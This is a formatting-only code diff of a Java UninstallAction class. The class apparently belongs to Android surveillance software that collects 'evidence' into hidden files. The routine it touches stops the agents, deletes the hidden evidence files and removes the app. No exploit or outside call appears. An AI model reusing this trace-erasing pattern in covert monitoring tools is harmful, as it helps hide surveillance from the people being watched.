@@ -49,7 +49,7 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	@Override
 	public boolean execute(Trigger trigger) {
-		Status.self().uninstall=true;
+		Status.self().uninstall = true;
 		return true;
 	}
 
@@ -59,7 +59,7 @@ public class UninstallAction extends SubActionSlow {
 	public static boolean actualExecute() {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (actualExecute): uninstall") ;//$NON-NLS-1$
+			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
 		}
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
@@ -78,9 +78,9 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	static boolean stopServices() {
 		if (Cfg.DEBUG) {
-			Check.log( TAG + " (stopServices)") ;//$NON-NLS-1$
+			Check.log(TAG + " (stopServices)");//$NON-NLS-1$
 		}
-		
+
 		ManagerAgent.self().stopAll();
 		ManagerEvent.self().stopAll();
 		Status.self().unTriggerAll();
@@ -94,14 +94,14 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	static boolean removeFiles() {
 		if (Cfg.DEBUG) {
-			Check.log( TAG + " (removeFiles)") ;//$NON-NLS-1$
+			Check.log(TAG + " (removeFiles)");//$NON-NLS-1$
 		}
-		
+
 		Markup.removeMarkups();
 
 		final int fileNum = EvidenceCollector.self().removeHidden();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (removeFiles): " + fileNum) ;//$NON-NLS-1$
+			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
 		}
 		return true;
 	}
@@ -113,7 +113,7 @@ public class UninstallAction extends SubActionSlow {
 	 */
 	static boolean deleteApplication() {
 		if (Cfg.DEBUG) {
-			Check.log( TAG + " (deleteApplication)") ;//$NON-NLS-1$
+			Check.log(TAG + " (deleteApplication)");//$NON-NLS-1$
 		}
 
 		final Uri packageURI = Uri.parse(Messages.getString("2.0")); //$NON-NLS-1$
